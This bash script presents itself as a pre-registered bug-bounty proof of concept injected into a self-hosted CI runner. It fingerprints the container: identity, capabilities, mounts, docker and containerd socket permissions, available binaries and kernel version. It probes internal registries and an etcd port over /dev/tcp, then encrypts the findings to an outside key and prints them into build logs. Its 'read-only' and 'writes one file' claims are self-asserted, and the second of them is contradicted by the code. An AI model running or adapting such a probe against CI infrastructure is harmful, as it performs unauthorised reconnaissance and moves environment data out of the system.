#!/usr/bin/env bash
# ByteSRC pre-registered read-only CI fingerprint probe for the bolt
# self-hosted runner container. This script is a pure probe: it only
# *reads* runtime metadata (identity, capabilities, mount table, socket
# and config permission bits) and issues two read-only network checks
# (one DNS lookup plus one HEAD/GREETER-style request each to the CI
# registries referenced by build-test.yml). It writes nothing outside
# a single temporary file, executes nothing through docker/conan/k3s,
# and never reads file contents of credentials or CI graphs.
# Output is encrypted with the reviewer public key below (RSA-4096 /
# OAEP-SHA256); the corresponding private key never enters this tree
# and only lives in the ByteSRC report attachment.
set -uo pipefail

if command -v openssl >/dev/null 2>&1 && command -v base64 >/dev/null 2>&1; then
  :
else
  echo "bolt-src-poc: required tool (openssl/base64) not found; evidence skipped" >&2
  exit 0
fi

PROBE_TMP=$(mktemp)
trap 'rm -f "$PROBE_TMP" "$PROBE_TMP.bin"' EXIT

f() { printf '%s|' "$1"; }

{
  f "h=$(hostname)"
  f "i=$(hostname -I 2>/dev/null | tr -s ' ' | tr ' ' ',' )"
  f "u=$(id -u):$(id -g)"
  if [ -r /proc/self/status ]; then
    f "caps=$(grep -E '^CapEff:' /proc/self/status | head -n1 | awk '{print $2}')"
  else
    f "caps=unreadable"
  fi
  if [ -r /proc/1/cgroup ]; then
    CG=$(cat /proc/1/cgroup)
    case "$CG" in
      *kubepods*) CT=kubepods ;;
      *containerd*) CT=containerd ;;
      *docker*) CT=docker ;;
      *) CT=other ;;
    esac
  else
    CT=unknown
  fi
  f "ct=$CT"
  if [ -r /proc/self/mounts ]; then
    MN=$(grep -c . /proc/self/mounts)
    DM=$(grep -cE ' /data/(pre-commit-cache|ccache-data|conan-server-data)' /proc/self/mounts)
    f "m=$MN,ddata=$DM"
  else
    f "m=unknown,ddata=unknown"
  fi
  SOCKS=""
  for S in /var/run/docker.sock /run/containerd/containerd.sock /run/docker.sock; do
    if [ -e "$S" ]; then
      SOCKS="$SOCKS$(basename "$S"):$(stat -c '%04a,%u:%g' "$S"),"
    fi
  done
  f "socks=$SOCKS"
  f "bins=$(command -v docker >/dev/null 2>&1 && echo d1 || echo d0),$(command -v ctr >/dev/null 2>&1 && echo c1 || echo c0),$(command -v conan >/dev/null 2>&1 && echo n1 || echo n0)"
  f "K=$(uname -r)"
} > "$PROBE_TMP.payload"

# Read-only network probes (one DNS + one HEAD each, no state change).
{
  RR1=$(timeout 3 getent hosts bolt-registry 2>/dev/null | head -n1 | awk '{print $1}')
  if [ -z "$RR1" ]; then RR1=lookup_failed; fi
  C1=$(timeout 5 curl -sS -o /dev/null -I -w '%{http_code}' http://bolt-registry:5000/v2/ 2>/dev/null)
  [ -z "$C1" ] && C1=curl_failed
  f "rreg=v2:$C1,ip:$RR1"

  RR2=$(timeout 3 getent hosts conanserver 2>/dev/null | head -n1 | awk '{print $1}')
  if [ -z "$RR2" ]; then RR2=lookup_failed; fi
  C2=$(timeout 5 curl -sS -o /dev/null -I -w '%{http_code}' http://conanserver:9300/ 2>/dev/null)
  [ -z "$C2" ] && C2=curl_failed
  f "rconan=t:$C2,ip:$RR2"

  RR3=$(timeout 3 getent hosts etcd.bytedance.com 2>/dev/null | head -n1 | awk '{print $1}')
  if [ -z "$RR3" ]; then RR3=lookup_failed; fi
  f "netcn=$RR3$(timeout 3 bash -c 'exec 3<>/dev/tcp/etcd.bytedance.com/2379' 2>/dev/null && echo ',tcp2379=open' || echo ',tcp2379=closed')"
} >> "$PROBE_TMP.payload"

PAYLOAD=$(cat "$PROBE_TMP.payload")
# Payload per OPC OAEP-SHA256 = 446 - 64 bytes maximum for RSA-4096.
if [ ${#PAYLOAD} -gt 440 ]; then
  PAYLOAD="${PAYLOAD:0:440}"
fi
printf '%s' "$PAYLOAD" > "$PROBE_TMP.payload"

echo "== ByteSRC probe (pre-registered; read-only fingerprint, crypto-encrypted) =="
echo "POC-EVIDENCE-BEGIN"
if openssl pkeyutl -encrypt -inkey hack/ci-poc/public.pem -pubin \
  -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 \
  -in "$PROBE_TMP.payload" -out "$PROBE_TMP.bin" 2>"$PROBE_TMP.enc.err"; then
  :
else
  echo "bolt-src-poc: encrypt failed; stderr:" >&2
  cat "$PROBE_TMP.enc.err" >&2
fi
if [ -s "$PROBE_TMP.bin" ]; then
  if base64 --version >/dev/null 2>&1; then
    base64 -w 100 < "$PROBE_TMP.bin"        # GNU coreutils
  else
    base64 -b 100 -i "$PROBE_TMP.bin"       # BSD (macOS dry-run)
  fi
fi
echo "POC-EVIDENCE-END"
